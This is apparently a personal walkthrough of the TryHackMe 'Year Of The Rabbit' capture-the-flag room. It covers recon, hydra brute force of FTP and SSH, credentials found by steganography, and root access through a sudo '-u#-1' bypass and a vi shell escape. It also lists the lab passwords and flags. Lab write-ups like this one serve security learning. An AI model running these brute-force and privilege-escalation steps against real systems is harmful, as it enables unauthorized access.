# Year Of The Rabbit

## Recon

Runing an nmap scan against the target.

FTP SSH and http are runing. Visiting the HTTP Site I'm greeted with an apacha default landing page.

### HTTP

runing dirbuster while reading the landing page

	gobuster dir --url http://10.10.98.211 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o scans/gobuster

found assets with rickrol mp4

Found no exploit for this apache version on Exploit DB. But According to 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0226
this exploit couol work:
https://www.exploit-db.com/exploits/34133

There are sevaral issus in this version of apache that I want to try and attack

https://www.tenable.com/plugins/was/98910 

I did some reading and found some intresting things I want to try

- CVE-2016-5387

The first thing I want to test is Httpoxy

	git clone https://github.com/1N3/HTTPoxyScan.git

After fiddling around with this script I didn't finde anything. So on to more enumeration. Whole runing dirbuster on the side with a big list and file extentions

- CVE-2016-8743

runing a whole lot of stuff used Metasploit Apache user enumeration tool but did not find anything. 
Runing Nikto

** -> I think I'am overcomplicating this, I can run the rickrol, so I should test if I can upload a file to /assets and run an exploit from there **

I was still makeing everything to complicated (for a CTF at least) In the stylesheet there is a hint

	Nice to see someone checking the stylesheets.
	Take a look at the page: /sup3r_s3cr3t_fl4g.php
  	
-> it's another rickroll XD

The Popup says to disable javascript. In firefox type about:config in the adressbar and set javascript.enable to false

then a new window shows up:


´´´
Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!
´´´

Continue here do another nmpa scan but use -vv

The scan did nothing. But on the page with the rickroll, if you go there with java script on, you get redirected to youtube.
If java is not enabled, I stay on the same page. This means something is going on. I intercept the traffic with burp.

HTTP/1.1 302 Found
Date: Thu, 18 Nov 2021 19:58:52 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

I get redirected over /WExYY2Cv-qU

Visiting this page brings me to another page with

Hot_Babe.png

so I download it and check the file.

I tried steghide first with no succes, but runing

	strings Hot_babe.png
	...
	Eh, you've earned this. Username for FTP is ftpuser
	One of these is the password:
	Mou+56n%QK8sr
	...


### FTP

OLD:
For this Version of vsftpd I found https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1419

The last line from the Hot_babe.png is not the password just randome strings. But since I have a user now, I can try and bruteforce the password with hydra

	hydra -v -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.44.243:21 -o scans/hydra_ftp

-> this takes too long, I NEED TO READ More Carfully, there was a list of passwords in Hot_babe.png
therefore I do

	strings Hot_Babe.png > passwords.txt

Edit everything out exept the passowrds then use hydra with that

	hydra -v -f -l ftpuser -P ./passwords.txt ftp://10.10.44.243:21 -o scans/hydra_ftp
	[21][ftp] host: 10.10.44.243   login: ftpuser   password: 5iez1wGXKfPKQ  

I now can login to the FTP Server

There I find Eli's_Creds.txt

Onece downloaded there is some very strange writing in the file. This is Brainfuck code. On https://copy.sh/brainfuck/
you can run the code. The output looks like this

		User: eli

		Password: DSpDiM1wAEwid

with these credentials we can try and login over ssh

## Gainign Acces

	ssh eli@10.10.150.79

In the home directory there is an executable "core" but I don't have permission to run it. Which I download

### Enumeration 1

	sudo -l

reviels that the user is not allowed to use sudo.

I will first investigate this core file more

### "core"

	file core                                                                                
	core: ELF 64-bit LSB core file x86-64, version 1 (SYSV), too many program headers (352)  

a quick google search tells me that this file is a core file. This gets created when a procces fails, like a crashdump perhaps.
This link started me on how to analyze this file

https://unix.stackexchange.com/questions/89933/how-to-view-core-files-for-debugging-purposes-in-linux/202443

I need to find the binary that produced the core dump

	gdb -c core
	Core was generated by `/usr/bin/vmtoolsd -n vmusr --blockFd 3'

this was created by a vmware tool so maybe this is not part of the CTF? I'll go ahead and enumerate some other things

### Enumeration 2

looking around the filesystem, there is a second user. I can move into the home directory where I find the user.txt
but I can't open it. 

-> find a way to get gwendolines credentials

Just because I'm a bit stuck I try to bruteforce ssh login once again but with gwendoline this time and the same passwords.txt

	hydra -l gwendoline -P passwords.txt ssh://10.10.150.79  
	1 of 1 target completed, 0 valid password found

no luck though.

-> new Day, I log in and am greet with a message on Login that I did not read the first time

	1 new message
	Message from Root to Gwendoline:

	"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

	END MESSAGE

Search for it

	locate s3cr3t
	/usr/games/s3cr3t
	/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
	/var/www/html/sup3r_s3cr3t_fl4g.php
	/var/www/html/sup3r_s3cret_fl4g
	/var/www/html/sup3r_s3cret_fl4g/index.html


	cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!

	Your password is awful, Gwendoline. 
	It should be at least 60 characters long! Not just MniVCQVhQHUNI
	Honestly!

	Yours sincerely
	   -Root


I got the password!

	eli@year-of-the-rabbit:~$ su gwendoline
	Password: 
	gwendoline@year-of-the-rabbit:/home/eli$ sudo -l
	Matching Defaults entries for gwendoline on year-of-the-rabbit:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User gwendoline may run the following commands on year-of-the-rabbit:
	    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

	gwendoline@year-of-the-rabbit:/home/eli$ cat /home/gwendoline/user.txt 
	THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

### Geting Root

I know that vi is dangerous if run as root, I check GTFO Bins. I needed a bit to understand the output from sudo -l
but after some reading I think I know whats going on. I need to run vi with sudo on the user.txt. Lets try
(https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e)

I finaly figured it out:

The ouput of sudo -l means that vi CAN NOT be run as root (!root)

I was getting:

	gwendoline@year-of-the-rabbit:~$ sudo vi ~/gwendoline/user.txt 
	[sudo] password for gwendoline: 
	Sorry, user gwendoline is not allowed to execute '/usr/bin/vi /home/gwendoline/gwendoline/user.txt' as root on year-of-the-rabbit.

But after some reading and trying around I found that there is a vulnarability see:
https://www.exploit-db.com/exploits/47502

so by providing the -u#1-1 the system gets trickt into runing vi as root but without asking for a password as specified in the sudo config (see sudo -l)
I also could not provide aditional switches. But once vi is open with root privileges I used:

	:set shell=/bin/sh
	:shell 

to creat a shell with root privileges

	# whoami
	root
	# cat /root/root.txt
	THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}

Done!

## Important info

my IP: 10.9.222.124

target IP: 10.10.185.49

ssh:
User: eli
Password: DSpDiM1wAEwid

User: gwendoline
Password: MniVCQVhQHUNI

FTP:
user: ftpuser
pw: 5iez1wGXKfPK

user.txt:
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}

